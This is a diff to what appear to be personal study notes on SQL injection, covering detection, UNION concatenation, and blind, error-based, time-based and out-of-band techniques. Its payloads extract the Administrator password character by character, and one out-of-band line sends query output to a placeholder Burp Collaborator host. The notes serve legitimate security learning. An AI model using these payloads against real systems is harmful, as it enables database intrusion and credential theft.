@@ -1,3 +1,7 @@
+Cheatsheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+(the syntax below might be different for different databases so pls refer to the cheatsheet!)
+
 Detection: Send `'` and it causes internal server error or other error. (If it gets encoded by the frontend send non-encoded version again in Burp to ensure.). This is bcos SQL uses `'` for string delimiters, so inside the SQL query most of the time it would be `SELECT * WHERE name='<user input>'`.
 
 Concatenating: You can concatenate multiple columns using `||`. Eg `' UNION SELECT username || '~' || password FROM users--`
@@ -40,9 +44,26 @@ For Oracle, every SELECT has to be paired with a FROM, so you probably have to d
 ## Blind SQLi
 When SQL data is not returned in plaintext but instead returns conditional responses based on SQL response.
 
-Narrow down specific fields using binary search (SUBSTRING is called SUBSTR on some databases):
+Check if it is vulnerable to blind SQLi:
+```sql
+xyz' AND 1=0--
+xyz' AND 1=1--
+```
+and check for differences in response
+
+Narrow down specific fields using binary search (SUBSTRING is called SUBSTR on some databases, refer to [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)):
 ```sql
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
 ```
 until u find the exact value of that field.
+
+## Error-based SQLi (inducing an error if there is not even a conditional response)
+`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
+(SUBSTRING is called SUBSTR on some databases, refer to [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)) and use binary search same as Blind SQLi
+
+## Time-based SQLi
+`' AND IF(Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm', SLEEP(5), 0)--` (for MySQL, refer to [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for others)
+
+## Out-of-band
+`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` (for MySQL, refer to [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for others)
